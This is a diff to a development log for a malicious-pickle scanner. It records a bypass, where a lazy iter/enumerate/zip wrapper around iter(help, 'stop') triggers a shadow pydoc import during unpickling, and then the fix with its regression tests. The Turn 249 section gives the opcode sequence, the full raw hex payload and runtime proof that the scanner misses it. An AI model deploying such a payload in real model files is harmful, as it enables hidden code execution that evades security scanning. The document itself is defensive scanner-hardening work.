@@ -15478,3 +15478,228 @@ Validation:
 - `mypy`: `Success: no issues found in 447 source files`.
 - Full non-slow/non-integration validation:
   `3755 passed, 1022 skipped, 21 warnings in 45.15s`.
+
+## Turn 249 - Bypass via laundering a call iterator through lazy wrappers
+
+Found another scanner-clean RCE-capable bypass in the call-iterator family. The
+native model now detects direct eager consumers such as `list(iter(help,
+"stop"))`, but a clean lazy wrapper can hide the tracked `CallIterator` before
+the final eager consumer sees it.
+
+The smallest representative is a one-argument `builtins.iter` wrapper:
+
+```python
+list(iter(iter(builtins.help, "stop")))
+```
+
+At runtime, the inner two-argument `iter(help, "stop")` creates a call iterator.
+The outer one-argument `iter(...)` returns an iterator for that object without
+calling `help`. The final `list(...)` consumes it, `help()` runs once, and
+`_sitebuiltins._Helper.__call__` imports `pydoc`. A shadow `pydoc.py` at the
+front of `sys.path` executes during `pickle.loads` and returns the sentinel, so
+the resulting list is empty.
+
+Payload shape:
+
+```text
+PROTO 4
+STACK_GLOBAL builtins iter
+STACK_GLOBAL builtins help
+SHORT_BINUNICODE "stop"
+TUPLE2
+REDUCE              # iter(help, "stop")
+MEMOIZE
+POP
+STACK_GLOBAL builtins iter
+BINGET 0
+TUPLE1
+REDUCE              # iter(call_iterator)
+MEMOIZE
+POP
+STACK_GLOBAL builtins list
+BINGET 1
+TUPLE1
+REDUCE              # list(iter(call_iterator))
+STOP
+```
+
+Raw payload:
+
+```text
+80048c086275696c74696e738c0469746572938c086275696c74696e738c0468656c70938c0473746f70865294308c086275696c74696e738c0469746572936800855294308c086275696c74696e738c046c69737493680185522e
+```
+
+Scanner proof:
+
+```text
+payload_len 91
+scan clean findings 0 errors ()
+imports [
+  ('builtins', 'iter', None, None),
+  ('builtins', 'help', None, None),
+  ('builtins', 'iter', None, None),
+  ('builtins', 'list', None, None),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'iter', 1, 66),
+  ('builtins', 'list', 1, 89),
+]
+```
+
+Runtime proof:
+
+```text
+runtime rc 0
+runtime_result []
+runtime_type list
+runtime_len 0
+marker_exists True
+marker_text owned-by-iter-wrapper
+runtime stderr
+```
+
+Sibling probes:
+
+```text
+enumerate len 96 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'enumerate', 1, 71),
+  ('builtins', 'list', 1, 94),
+]
+
+zip len 90 scan clean findings 0
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'zip', 1, 65),
+  ('builtins', 'list', 1, 88),
+]
+```
+
+Both sibling payloads executed the same shadow `pydoc.py` marker proof in a
+child interpreter and returned an empty list.
+
+Why it bypasses:
+
+- Native policy does not mark `builtins.iter`, `builtins.help`,
+  `builtins.enumerate`, `builtins.zip`, or `builtins.list` as dangerous.
+- `call_iterator_result(...)` tracks only the inner two-argument
+  `iter(callable, sentinel)` as `StackValue::CallIterator`.
+- The outer one-argument `iter(...)`, `enumerate(...)`, and `zip(...)` calls
+  push ordinary constructed results, so `list(...)` receives
+  `StackValue::Constructed(...)` rather than the original `CallIterator`.
+- The final eager consumer therefore emits no hidden zero-argument
+  `builtins.help` invocation, and the Python call graph never sees the
+  `_sitebuiltins._Helper.__call__ -> builtins.__import__` path.
+- The payload contains no `pydoc`, `import`, `__import__`, `eval`, `exec`,
+  `os.system`, or `subprocess` strings.
+
+Likely source-level defense:
+
+- Treat `StackValue::CallIterator` as a deferred iterator effect, not only the
+  exact result of two-argument `iter`.
+- Propagate that effect through clean lazy wrappers such as one-argument
+  `builtins.iter`, `builtins.enumerate`, and `builtins.zip` when any wrapped
+  iterable is a tracked call iterator.
+- Let existing eager-consumer modeling (`list`, `tuple`, `dict`, `any`,
+  `deque`, etc.) consume the propagated value and emit the stored callable as a
+  synthetic zero-argument invocation.
+- This is a simplification over adding consumer-wrapper pairs: finite wrapper
+  propagation plus finite eager sinks blocks the family.
+
+Performance note:
+
+- Payload size is 91 bytes.
+- Warm scan median over 1000 runs was `0.000061s`, p95 `0.000065s`, and max
+  `0.000091s`.
+- A fix can stay stack-local by rewriting known lazy wrapper reducer results to
+  a propagated deferred iterator value; it does not need package imports or
+  extra byte scanning.
+
+## Turn 250 - Defense for lazy call-iterator wrappers
+
+Blocked the Turn 249 lazy-wrapper bypass at the native stack-model source.
+Instead of adding wrapper/consumer pairs, the fix treats a tracked call iterator
+as a deferred iterator effect and propagates that effect through clean lazy
+wrappers.
+
+Implementation:
+
+- `push_reducer_result(...)` now checks `lazy_call_iterator_wrapper_result(...)`
+  after direct two-argument `iter(callable, sentinel)` construction.
+- One-argument `builtins.iter(call_iterator)` propagates the existing
+  `StackValue::CallIterator`.
+- `builtins.enumerate(call_iterator[, start])` propagates the same deferred
+  callable while preserving lazy construction as clean until a later consumer.
+- `builtins.zip(...)` propagates the first tracked call iterator among its
+  iterable arguments.
+- Existing eager-consumer modeling then handles the rest. For example,
+  `list(iter(iter(help, "stop")))` now reaches the existing `list(...)`
+  consumer path and emits a synthetic zero-argument `builtins.help` invocation.
+
+Regression coverage:
+
+- Added `test_scan_bytes_blocks_lazy_wrapper_call_iterator_consumption_rce`.
+- Covered `iter`, `enumerate`, `enumerate(..., start)`, and `zip` wrappers.
+- Each case verifies wrapper construction alone remains clean, consuming the
+  wrapper with `list(...)` is malicious, the report includes a hidden
+  zero-argument `builtins.help` invocation, and a child interpreter writes the
+  shadow `pydoc.py` marker during `pickle.loads`.
+
+Post-fix proof for the exact Turn 249 payload:
+
+```text
+payload_len 91
+scan malicious findings 1 errors ()
+dangerous [('_sitebuiltins', '_Helper.__call__', 'builtins.__import__')]
+imports [
+  ('builtins', 'iter', None, None),
+  ('builtins', 'help', None, None),
+  ('builtins', 'iter', None, None),
+  ('builtins', 'list', None, None),
+]
+invocations [
+  ('builtins', 'iter', 2, 43),
+  ('builtins', 'iter', 1, 66),
+  ('builtins', 'list', 1, 89),
+  ('builtins', 'help', 0, 89),
+]
+runtime rc 0
+runtime_result []
+runtime_type list
+runtime_len 0
+marker_exists True
+marker_text owned-by-iter-wrapper
+runtime stderr
+timing_median 0.000134
+timing_p95 0.000143
+timing_max 0.000204
+```
+
+Performance note:
+
+- The propagation check is stack-local and runs only on reducer results.
+- It is a constant-size match over three built-in lazy wrappers plus a bounded
+  scan of already-tracked tuple arguments for `zip`.
+- Warm median for the fixed 91-byte payload was `0.000134s` over 1000 runs.
+
+Validation:
+
+- Rust formatting:
+  `cargo fmt --manifest-path packages/modelaudit-picklescan/Cargo.toml`.
+- Rust unit tests: `78 passed`.
+- Rebuilt the local ignored extension with release `cargo build` plus macOS
+  dynamic-lookup linker flags, then copied it to
+  `packages/modelaudit-picklescan/src/modelaudit_picklescan/_rust.abi3.so` for
+  Python tests.
+- Focused lazy-wrapper regressions: `4 passed in 0.39s`.
+- Focused import/call-graph regression file: `44 passed in 1.46s`.
+- Focused call-graph suite: `82 passed in 3.06s`.
+- Focused `click.utils.LazyFile` startup-hook regression: `1 passed in
+  0.67s`.
+- `ruff format`: `392 files left unchanged`.
+- `ruff check --fix`: `All checks passed!`.
+- `mypy`: `Success: no issues found in 447 source files`.
+- Full non-slow/non-integration validation:
+  `3759 passed, 1022 skipped, 21 warnings in 39.29s`.
